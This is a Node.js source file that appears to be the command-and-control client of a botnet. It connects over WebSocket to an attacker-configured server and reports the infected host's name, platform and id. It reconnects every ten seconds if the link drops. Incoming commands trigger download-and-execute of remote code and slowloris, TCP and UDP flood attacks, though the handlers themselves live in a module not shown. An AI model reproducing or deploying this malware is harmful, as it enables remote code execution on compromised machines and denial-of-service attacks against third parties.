const { WebSocket } = require("ws");
const config = require("../config");
const commands = require("../commands");
const identification = require("./identification");

let ws = {};
let canClose = false;

function parseCommand(command) {
    if (command.includes("rde http")) {
        commands.downloadExecute(command);
    } else if (command.includes("slowloris")) {
        commands.ddos.slowloris(command);
    } else if (command.includes("tcp")) {
        commands.ddos.tcpFlood(command);
    } else if (command.includes("udp")) {
        commands.ddos.udpFlood(command);
    }
}

function connect() {
    ws = new WebSocket(`ws://${config.common.ip}:${config.common.port}/`);

    ws.on("open", () => {
        console.log("open");
        ws.send(
            `identification ${identification.name} ${identification.platform} ${identification.id}`
        );
    });

    ws.on("message", (data) => {
        const message = data.toString();
        if (message === "quit") {
            ws.send(
                `bye ${identification.id}`
            );
            canClose = true;
            ws.close(1000, "bot life is so short :-(");
        } else {
            parseCommand(message);
        }
    });

    ws.on("error", (error) => {
        console.log("error", error);
    });

    ws.on("close", () => {
        console.log("close");
        reconnect();
    });
}

function reconnect() {
    if (canClose === false) {
        setTimeout(connect, 10000);
    }
}

module.exports = connect